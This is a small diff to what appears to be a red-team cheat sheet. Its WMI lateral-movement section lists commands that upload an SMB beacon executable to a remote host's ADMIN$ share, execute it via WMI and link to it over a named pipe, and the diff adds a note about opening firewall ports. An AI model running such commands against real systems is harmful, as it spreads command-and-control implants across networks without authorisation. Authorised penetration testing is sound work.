@@ -379,13 +379,13 @@ jump psexec64 <HOSTNAME> <LISTENER>
 
 ### WMI
 - Not a jump command but can be used manually
+- Make sure the firewall is open for the ports used!
 ```
 cd \\<HOSTNAME>\ADMIN$
 upload <SMB BEACON EXE>
 remote-exec wmi <HOSTNAME> <BEACON EXE>
 link <HOSTNAME> <PIPE>
 ```
-
 
 ```
 cd \\<HOSTNAME>\ADMIN$
